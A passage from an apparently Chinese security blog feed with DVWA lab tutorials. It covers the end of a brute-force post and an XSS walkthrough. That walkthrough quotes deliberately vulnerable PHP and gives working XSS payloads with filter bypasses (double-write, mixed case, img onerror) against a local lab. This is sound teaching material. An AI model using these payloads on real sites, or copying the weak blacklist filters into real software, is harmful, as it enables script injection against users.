alt="打印的结果"></p><p>对比结果看到，密码为password时返回的长度不太一样，手工验证，登录成功，爆破完成。</p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a><strong>Impossible</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Login'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input </span></span><br><span class="line">    $user = $_POST[ <span class="string">'username'</span> ]; </span><br><span class="line">    $user = stripslashes( $user ); </span><br><span class="line">    $user = mysql_real_escape_string( $user ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input </span></span><br><span class="line">    $pass = $_POST[ <span class="string">'password'</span> ]; </span><br><span class="line">    $pass = stripslashes( $pass ); </span><br><span class="line">    $pass = mysql_real_escape_string( $pass ); </span><br><span class="line">    $pass = md5( $pass ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values </span></span><br><span class="line">    $total_failed_login = <span class="number">3</span>; </span><br><span class="line">    $lockout_time       = <span class="number">15</span>; </span><br><span class="line">    $account_locked     = <span class="keyword">false</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information) </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">    $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out. </span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $row[ <span class="string">'failed_login'</span> ] &gt;= $total_failed_login ) )  &#123; </span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration! </span></span><br><span class="line">        <span class="comment">//echo "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;"; </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again </span></span><br><span class="line">        $last_login = $row[ <span class="string">'last_login'</span> ]; </span><br><span class="line">        $last_login = strtotime( $last_login ); </span><br><span class="line">        $timeout    = strtotime( <span class="string">"&#123;$last_login&#125; +&#123;$lockout_time&#125; minutes"</span> ); </span><br><span class="line">        $timenow    = strtotime( <span class="string">"now"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn't locked the account </span></span><br><span class="line">        <span class="keyword">if</span>( $timenow &gt; $timeout ) </span><br><span class="line">            $account_locked = <span class="keyword">true</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password) </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">    $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login... </span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $account_locked == <span class="keyword">false</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        $avatar       = $row[ <span class="string">'avatar'</span> ]; </span><br><span class="line">        $failed_login = $row[ <span class="string">'failed_login'</span> ]; </span><br><span class="line">        $last_login   = $row[ <span class="string">'last_login'</span> ]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login? </span></span><br><span class="line">        <span class="keyword">if</span>( $failed_login &gt;= $total_failed_login ) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;"</span>; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。</p><p><img src="http://image.3001.net/images/20161009/1476000620885.png!small" alt="爆破提示"></p><p>同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。</p><p><strong>关于PDO</strong></p><p><a href="http://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html" target="_blank" rel="noopener">http://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="DVWA教程" scheme="http://wlfsky.com/tags/DVWA%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DVWA之XSS</title>
    <link href="http://wlfsky.com/2018/01/19/DVWA%E4%B9%8BXSS/"/>
    <id>http://wlfsky.com/2018/01/19/DVWA之XSS/</id>
    <published>2018-01-19T02:18:18.000Z</published>
    <updated>2018-01-19T08:52:04.788Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><strong><em>本文参考自 FreeBuf.COM：lonehand</em></strong></p><h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a><strong>DVWA简介</strong></h2><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p>DVWA共有十个模块，分别是</p><blockquote><p>Brute Force（蛮力攻击）</p><p>Command Injection（命令行注入）</p><p>CSRF（跨站请求伪造）</p><p>File Inclusion（文件包含）</p><p>File Upload（文件上传）</p><p>Insecure CAPTCHA （不安全的验证码）</p><p>SQL Injection（SQL注入）</p><p>SQL Injection（Blind）（SQL盲注）</p><p>XSS（Reflected）（反射型跨站脚本）</p><p>XSS（Stored）（存储型跨站脚本）</p></blockquote><p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p><p><img src="/img/dvwa-sql-1.png" alt="dvwa-sql-1.png"></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a><strong>XSS</strong></h2><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p><p>DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。</p><p>（注：下面的实验都是在Firefox浏览器下进行的，感谢火狐没做XSS filter）</p><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a><strong>反射型XSS</strong></h2><p>下面对四种级别的代码进行分析。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a><strong>Low</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，成功弹框：</p><p><img src="/img/dvwa-xss-1.png" alt="dvwa-xss-1.png"></p><p>相应的XSS链接：</p><p><a href="">http://127.0.0.1/DVWA-1.9/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#</a></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a><strong>Medium</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的 <code>&lt;script&gt;</code> 删除，这种防护机制是可以被轻松绕过的。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>1.双写绕过</p><p>输入<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code>，成功弹框：</p><p><img src="/img/dvwa-xss-1.png" alt="dvwa-xss-1.png"></p><p>相应的XSS链接：</p><p><a href="">http://127.0.0.1/DVWA-1.9/vulnerabilities/xss_r/?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#</a></p><p>2.大小写混淆绕过</p><p>输入<code>&lt;ScRipt&gt;alert(/xss/)&lt;/script&gt;</code>，成功弹框：</p><p><img src="/img/dvwa-xss-1.png" alt="dvwa-xss-1.png"></p><p>相应的XSS链接：</p><p><a href="">http://127.0.0.1/DVWA-1.9/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#</a></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace()函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>虽然无法使用<code>&lt;script&gt;</code>标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p><p>输入<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>，成功弹框：</p><p><img src="/img/dvwa-xss-2.png" alt="dvwa-xss-2.png"></p><p>相应的XSS链接：</p><p><a href="">http://127.0.0.1/DVWA-1.9/vulnerabilities/xss_r/?name=%3Cimg+src%3D1+onerror%3Dalert%28%2Fxss%2F%29%3E#</a></p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素。</p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a><strong>存储型XSS</strong></h2><p>下面对四种级别的代码进行分析。</p><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>相关函数介绍</p><p>trim(string,charlist)函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p><p>mysql_real_escape_string(string,connection)函数会对字符串中的特殊符号(\x00，\n，\r，\，‘，“，\x1a)进行转义。</p><p>stripslashes(string)函数删除字符串中的反斜杠。</p></blockquote><p>可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。</p><h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>message一栏输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，成功弹框：</p><p><a href="http://image.3001.net/images/20161223/14824826941488.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161223/14824826941488.png!small" alt="1.png"></a></p><p>name一栏前端有字数限制，抓包改为<code>&lt;script&gt;alert(/name/)&lt;/script&gt;</code>：</p><p><a href="http://image.3001.net/images/20161223/14824827265355.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161223/14824827265355.png!small" alt="1.png"></a></p><p>成功弹框：</p><p><a href="http://image.3001.net/images/20161223/14824827533689.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161223/14824827533689.png!small" alt="1.png"></a></p><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>相关函数说明</p><p>strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签。</b></p><p>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</p></blockquote><p>可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS。</p><h3 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>1.双写绕过</p><p>抓包改name参数为<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code>:</p><p><a href="http://image.3001.net/images/20161223/14824828493990.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161223/14824828493990.png!small" alt="1.png"></a></p><p>成功弹框：</p><p><a href="http://image.3001.net/images/20161223/14824828893635.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161223/14824828893635.png!small" alt="1.png"></a></p><p>2.大小写混淆绕过</p><p>抓包改name参数为<code>&lt;Script&gt;alert(/xss/)&lt;/script&gt;</code>:</p><p><a href="http://image.3001.net/images/20161223/14824829148314.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161223/14824829148314.png!small" alt="1.png"></a></p><p>成功弹框：</p><p><a href="http://image.3001.net/images/20161223/14824829417920.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161223/14824829417920.png!small" alt="1.png"></a></p><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span 